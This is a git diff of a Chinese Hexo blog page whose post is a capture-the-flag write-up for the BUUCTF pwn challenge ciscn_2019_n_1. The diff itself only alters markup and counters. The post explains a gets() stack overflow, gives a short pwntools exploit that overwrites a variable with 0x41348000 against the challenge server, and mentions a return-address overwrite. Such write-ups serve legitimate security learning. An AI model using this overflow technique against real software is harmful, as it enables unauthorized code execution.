@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
+<head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
@@ -151,7 +153,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T4-ciscn-2019-n-1"><span class="nav-text">T4 ciscn_2019_n_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text">T4 ciscn_2019_n_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x03</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -177,7 +179,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -369,14 +371,14 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="T4-ciscn-2019-n-1"><a href="#T4-ciscn-2019-n-1" class="headerlink" title="T4 ciscn_2019_n_1"></a>T4 ciscn_2019_n_1</h2><blockquote>
+        <h2><span id="t4-ciscn_2019_n_1">T4 ciscn_2019_n_1</span></h2><blockquote>
 <p>2023-01-08WP<br>BUUCTF pwn第四题</p>
 </blockquote>
 <span id="more"></span>
 
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>先<strong>file，chekcsec</strong>——64-bit，开启<strong>NX</strong><br><img data-src="https://pic2.zhimg.com/80/v2-fcbfe99feb2a92abc72a297e219777e9_1440w.webp"></p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>IDA</strong>中main函数没啥有用的，看到还有一个fun函数<br><img data-src="https://pic2.zhimg.com/80/v2-ba42478d6dfc7d2b91ba248e835a4429_1440w.webp"><br>点进去看发现有个gets函数，可能存在栈溢出，同时发现if ( v2 &#x3D;&#x3D; 11.28125 )时调用system函数，所以想到输入来使v2的值等于11.28125<br>但是gets读入的时v1而不是v2，所以又想到让v1溢出，使溢出的值为11.28125并让它成为v2的值<br>于是进去查看v1v2的地址<br><img data-src="https://pic3.zhimg.com/80/v2-f9dc01951802e4c151cf6ddd0fdd1eee_1440w.webp"><br><img data-src="https://pic4.zhimg.com/80/v2-f90e4938ab553be25f298598c50e7d03_1440w.webp"><br>计算得长度为44h</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>exp</strong></p>
+<h3><span id="0x01">0x01</span></h3><p>先<strong>file，chekcsec</strong>——64-bit，开启<strong>NX</strong><br><img data-src="https://pic2.zhimg.com/80/v2-fcbfe99feb2a92abc72a297e219777e9_1440w.webp"></p>
+<h3><span id="0x02">0x02</span></h3><p><strong>IDA</strong>中main函数没啥有用的，看到还有一个fun函数<br><img data-src="https://pic2.zhimg.com/80/v2-ba42478d6dfc7d2b91ba248e835a4429_1440w.webp"><br>点进去看发现有个gets函数，可能存在栈溢出，同时发现if ( v2 &#x3D;&#x3D; 11.28125 )时调用system函数，所以想到输入来使v2的值等于11.28125<br>但是gets读入的时v1而不是v2，所以又想到让v1溢出，使溢出的值为11.28125并让它成为v2的值<br>于是进去查看v1v2的地址<br><img data-src="https://pic3.zhimg.com/80/v2-f9dc01951802e4c151cf6ddd0fdd1eee_1440w.webp"><br><img data-src="https://pic4.zhimg.com/80/v2-f90e4938ab553be25f298598c50e7d03_1440w.webp"><br>计算得长度为44h</p>
+<h3><span id="0x03">0x03</span></h3><p><strong>exp</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,25907)</span><br><span class="line">payload=b&quot;a&quot;*44+p64(0x41348000)#0x41348000是11.28125的十六进制数</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()          </span><br></pre></td></tr></table></figure>
 <p><del>直接写11.28125好像没用……</del><br><img data-src="https://pic1.zhimg.com/80/v2-c5edce340e57ef721fc68134243ee168_1440w.webp"><br>网上看到一篇<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41560595/article/details/108783758">博客</a>是直接从IDA中找十六进制数的<br>pwn得flag<br>还有一种方法就是直接覆盖v1v2，让返回地址指向调用system函数的地址0x4006BE<br><img data-src="https://pic4.zhimg.com/80/v2-cf387e39d529bbf5bdf92c02f6064f97_1440w.webp"><br>这就让我有<strong>一些疑惑：</strong>就这一题来说，开启了NX有没有让题目难度增加呢？</p>
 
@@ -586,13 +588,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">211k</span>
+    <span title="站点总字数">212k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:12</span>
+    <span title="站点阅读时长">3:13</span>
   </span>
 </div>
 <div class="busuanzi-count">
